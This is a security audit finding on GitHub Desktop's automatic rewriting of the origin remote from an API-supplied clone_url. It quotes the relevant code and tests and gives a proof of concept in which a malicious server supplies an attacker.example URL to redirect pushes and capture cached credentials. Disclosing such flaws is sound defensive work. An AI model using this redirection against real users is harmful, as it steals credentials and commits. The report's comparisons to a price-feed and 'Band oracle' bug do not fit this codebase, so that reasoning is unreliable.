### Title
Silent, host-unverified rewrite of the git push remote from an untrusted API `clone_url` field - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl()` is invoked automatically on every fetch/pull cycle (via `repositoryWithRefreshedGitHubRepository` → `_fetch`/`_fetchRemote`/`withRefreshedGitHubRepository` in `app/src/lib/stores/app-store.ts`) to keep the local `origin` remote in sync with GitHub after a repository rename. It trusts the `clone_url` field of the API repository object and silently calls `gitStore.setRemoteURL(...)` to change the user's push destination — the only safety checks performed are on **protocol** and on whether the *previous* cached clone URL still matches the current remote, never on the **new** hostname/owner/name. This mirrors the price-feed bug pattern: instead of reverting/prompting when the trusted invariant ("the API and the remote refer to the same host") can't be verified, the code proceeds and commits to the untrusted value.

### Finding Description
`app/src/lib/stores/updates/update-remote-url.ts`: [1](#0-0) 

The decision to rewrite the remote is gated by three conditions:
1. `protocolsMatch` — only compares `https:` vs `ssh:`/`git:` etc., **never the hostname**.
2. `remoteUrlUnchanged` — verifies the *current* remote still equals the previously-cached `gitHubRepository.cloneURL`, i.e. it only detects that the user hasn't manually edited the remote; it says nothing about the *new* URL.
3. `!urlsMatch` — true whenever the new `clone_url` differs from the current remote (which is exactly what a legitimate rename produces, but also what a spoofed/malicious `clone_url` produces).

If all three hold, `gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)` is called with **no host allow-listing and no user confirmation**: [2](#0-1) 

The `updatedRemoteUrl` originates directly from an API response object fetched in `repositoryWithRefreshedGitHubRepository`: [3](#0-2) 

`api.fetchRepository(owner, name)` is called against whichever endpoint the matched `account` uses — which can be an arbitrary GitHub Enterprise Server the user has added, or any endpoint reachable by a network-level attacker/compromised proxy in front of it. That JSON object's `clone_url` (and `ssh_url`) fields are attacker-influenced data, analogous to the Band oracle's untrusted `observations`/`latestBandData` — the code consumes them without validating they still point at the expected host/owner/name, and silently commits the corrupted value into the invariant it maintains (the git remote used for every subsequent push).

Existing guards do not stop this path because:
- `urlMatchesRemote`/`urlsMatch` are used only to decide *whether* to rewrite, not to *validate* the new value.
- `protocolsMatch` intentionally ignores hostname ("If protocol is null that implies the url is an ssh url ... we assume the user manually configured this format").
- There is no UI dialog for this automatic rewrite path (compare with `UpstreamAlreadyExists`, which *does* prompt the user before changing the `upstream` remote — this asymmetry shows the maintainers know remote rewrites are sensitive, but didn't apply the same guard to `origin`).

### Impact Explanation
Because the remote rewrite happens silently as part of routine background/foreground fetch (`_fetch`/`_fetchRemote`), the next time the user runs "Push" from GitHub Desktop, `dugite`/git will push to the attacker-controlled host instead of GitHub. Depending on the protocol:
- HTTPS: git's credential helper will supply the user's cached GitHub token/credentials as Basic Auth to the attacker's host — direct credential/token exfiltration.
- SSH: the user's SSH key will be offered to the attacker's host (less severe leak, but confirms key fingerprint and can be used for further attacks; some SSH configs auto-accept and could be tricked into signing operations).

Either way, the user's next commits are silently pushed somewhere other than where they believe, matching "silent corruption of what the user commits or pushes."

### Likelihood Explanation
The attack requires the ability to influence the API repository object returned to Desktop's `fetchRepository` call for the account in question. This is realistic for:
- Any GitHub Enterprise Server the user has added as an account (which the app treats identically to github.com, and which is common in the target audience for Desktop);
- A network-adjacent attacker able to intercept/replay TLS traffic to a GHES instance with a custom or user-trusted CA;
- A compromised/malicious GHES admin.

No local access, no leaked credentials, and no unusual user action are required beyond normal use (fetch/pull, which Desktop does automatically in the background). This makes it a plausible, if not everyday, unprivileged network/API-object attacker scenario within the stated valid-impact rules.

### Recommendation
Validate the **new** `clone_url`/`ssh_url` hostname against an allow-list before silently rewriting `origin` (e.g., require it match the same hostname as the account's endpoint, or the existing remote's hostname, changing only owner/name on rename). If the hostname changes, prompt the user for confirmation the same way `UpstreamAlreadyExists` does for the upstream remote, rather than rewriting `origin` silently.

### Proof of Concept
1. Add a GitHub Enterprise Server account in Desktop pointing at `ghes.corp.example` (attacker-controlled or MITM'd instance), and clone/track a repository `org/repo` from it as `origin`.
2. On a subsequent fetch, `repositoryWithRefreshedGitHubRepository` calls `api.fetchRepository('org', 'repo')` against `ghes.corp.example`. The attacker's server returns `clone_url: "https://attacker.example/org/evil-repo.git"` (same `https:` protocol, different host).
3. `updateRemoteUrl` observes `protocolsMatch === true`, `remoteUrlUnchanged === true` (the local remote still matches the last-known-good cloneURL), and `urlsMatch === false` (hosts differ) — all conditions to rewrite are satisfied.
4. `gitStore.setRemoteURL('origin', 'https://attacker.example/org/evil-repo.git')` is called with no prompt.
5. The user's next `git push` from Desktop sends commits (and, over HTTPS, their credential-helper-cached token) to `attacker.example`.

The existing unit test suite (`app/test/unit/stores/updates/update-remote-url-test.ts`) exercises the "URL changed → remote is updated" path with same-host fixtures only [4](#0-3) , confirming there is no host-equality assertion guarding this behavior.

### Citations

**File:** app/src/lib/stores/updates/update-remote-url.ts (L7-45)
```typescript
export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
```

**File:** app/src/lib/stores/app-store.ts (L4887-4907)
```typescript
    const { account, owner, name } = match
    const { endpoint } = account
    const api = API.fromAccount(account)
    const apiRepo = await api.fetchRepository(owner, name)

    if (apiRepo === null) {
      // If the request fails, we want to preserve the existing GitHub
      // repository info. But if we didn't have a GitHub repository already or
      // the endpoint changed, the skeleton repository is better than nothing.
      if (endpoint !== repository.gitHubRepository?.endpoint) {
        const ghRepo = await repoStore.upsertGitHubRepositoryFromMatch(match)
        return repoStore.setGitHubRepository(repository, ghRepo)
      }

      return repository
    }

    if (repository.gitHubRepository) {
      const gitStore = this.gitStoreCache.get(repository)
      await updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)
    }
```

**File:** app/test/unit/stores/updates/update-remote-url-test.ts (L68-81)
```typescript
  it("updates the repository's remote url when the github url changes", async t => {
    const { gitHubRepository, gitStore } = await createRepository(
      t,
      apiRepository
    )
    assert(gitStore.currentRemote !== null)

    const originalUrl = gitStore.currentRemote.url
    const updatedUrl = 'https://github.com/my-user/my-updated-repo'
    const updatedApiRepository = { ...apiRepository, clone_url: updatedUrl }
    await updateRemoteUrl(gitStore, gitHubRepository, updatedApiRepository)
    assert.notEqual(originalUrl, updatedUrl)
    assert.equal(gitStore.currentRemote.url, updatedUrl)
  })
```
